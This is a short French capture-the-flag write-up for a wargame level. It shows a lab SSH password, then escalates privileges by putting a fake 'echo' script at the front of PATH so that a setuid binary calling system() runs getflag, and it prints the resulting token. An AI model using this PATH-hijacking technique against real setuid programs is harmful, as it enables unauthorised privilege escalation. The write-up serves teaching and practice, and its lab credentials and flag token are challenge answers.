# Level03

Se connecter en tant que `level03`:

    $ ssh 192.168.1.124 -p 4242 -l level03
    level03@192.168.1.124's password: kooda2puivaav1idi4f57q8iq

---

	$ ls -l
	-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

	$ file level03
	(binary file with setuid setgid)

	$ ./level03
	Exploit me

On va analyser le programme avec `strings`

	$ strings level03
	...
	/usr/bin/env echo Exploit me
	...

On voit que la fonction system est appelée avec le parametre `/usr/bin/env 'echo' %s`

Il va falloir creer un `faux echo` qui va en fait executer getflag

	$ echo "/bin/getflag" > /tmp/echo
	$ chmod +x /tmp/echo

Puis ajouter /tmp dans le PATH en premier pour que le systeme le trouve dedans

	$ PATH=/tmp:$PATH

Et enfin lancer le binaire

	$ ./level03
	Check flag.Here is your token : qi0maab88jeaj46qoumi7maus


